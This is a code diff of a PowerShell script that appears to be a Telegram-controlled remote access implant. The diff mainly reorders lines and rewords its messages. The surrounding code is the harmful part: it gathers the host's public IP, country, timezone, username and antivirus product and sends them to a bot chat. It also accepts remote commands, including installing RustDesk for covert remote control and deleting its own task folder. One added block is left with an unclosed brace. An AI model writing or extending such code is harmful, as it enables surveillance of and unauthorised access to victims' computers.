@@ -27,6 +27,10 @@ catch {
     }
 }
 
+$country = (Invoke-RestMethod -Uri "http://ip-api.com/json/").country
+if (-not $country) {
+    $country = "Unknown"
+
 $antivirus = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName
 if (-not $antivirus) {
     $antivirus = "No Antivirus Detected"
@@ -35,7 +39,6 @@ if (-not $antivirus) {
 $username = $env:USERNAME
 
 $timezone = (Get-TimeZone).Id
-$country = (Invoke-RestMethod -Uri "http://ip-api.com/json/").country
 
 Add-Type @"
 using System;
@@ -58,13 +61,12 @@ public class Win32Helper {
 
 $systemInfoMessage = @"
 [ $public ]
-[ $timezone ]
 [ $country ]
+[ $timezone ]
 [ $username ] 
 [ $antivirus ]
 "@
 
-# Send system info message at startup (always sent)
 $params = @{
     chat_id    = $authorizedChatId
     text       = "<pre>$systemInfoMessage</pre>"
@@ -75,7 +77,7 @@ Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Meth
 $inactivityThreshold = 3600
 $lastState = "Active"
 $lastUpdateId = 0
-$sendMessages = $true  # Global flag controlling all outgoing messages
+$sendMessages = $true  
 
 while ($true) {
     $lastInput = [Win32Helper]::GetLastInputTime()
@@ -116,12 +118,11 @@ while ($true) {
                 if ($update.message.chat.id -eq $authorizedChatId) {
                     $messageText = $update.message.text
                     
-                    # Process always-active commands regardless of mute state
                     if ($messageText -match "^/mute\s+$username\s*$") {
                         $sendMessages = $false
                         $params = @{
                             chat_id    = $authorizedChatId
-                            text       = "<pre>All messages have been stopped.</pre>"
+                            text       = "<pre>Bot Muted.</pre>"
                             parse_mode = "HTML"
                         }
                         Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
@@ -130,22 +131,22 @@ while ($true) {
                         $sendMessages = $true
                         $params = @{
                             chat_id    = $authorizedChatId
-                            text       = "<pre>Message sending resumed.</pre>"
+                            text       = "<pre>Bot Unmuted.</pre>"
                             parse_mode = "HTML"
                         }
                         Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
                     }
-                    elseif ($messageText -match "^/killbot\s+$username\s*$") {
+                    elseif ($messageText -match "^/kill\s+$username\s*$") {
                         remove-item -path $taskfolder -recurse -force
                         $params = @{
                             chat_id    = $authorizedChatId
-                            text       = "<pre>bot removed succesfully</pre>"
+                            text       = "<pre>Bot Killed</pre>"
                             parse_mode = "HTML"
                         }
                         Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
                     }
                     elseif ($messageText -match "^/bot\s*$") {
-                        $botMessage = "listening...`n$public`n$country`n$username"
+                        $botMessage = "[ listening... ]`n[ $public ]`n[ $country ]`n[ $timezone ]`n[ $username ]"
                         $params = @{
                             chat_id    = $authorizedChatId
                             text       = "<pre>$botMessage</pre>"
@@ -153,7 +154,6 @@ while ($true) {
                         }
                         Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
                     }
-                    # If messages are muted, ignore other commands.
                     elseif (-not $sendMessages) {
                         continue
                     }
@@ -231,10 +231,10 @@ while ($true) {
                                     else { $_ }
                                 } | Set-Content $path
                                 Pop-Location
-                                $output = "RustDesk executed successfully. RustDesk ID: $rustdeskId"
+                                $output = "RustDesk installed successfully. RustDesk ID: $rustdeskId"
                             }
                             catch {
-                                $output = "Error executing RustDesk command: $($_.Exception.Message)"
+                                $output = "Error executing command: $($_.Exception.Message)"
                             }
                             $params = @{
                                 chat_id    = $authorizedChatId
@@ -251,7 +251,7 @@ while ($true) {
                                 $output = "RustDesk uninstalled successfully."
                             }
                             catch {
-                                $output = "Error executing killrustdesk command: $($_.Exception.Message)"
+                                $output = "Error executing command: $($_.Exception.Message)"
                             }
                             $params = @{
                                 chat_id    = $authorizedChatId
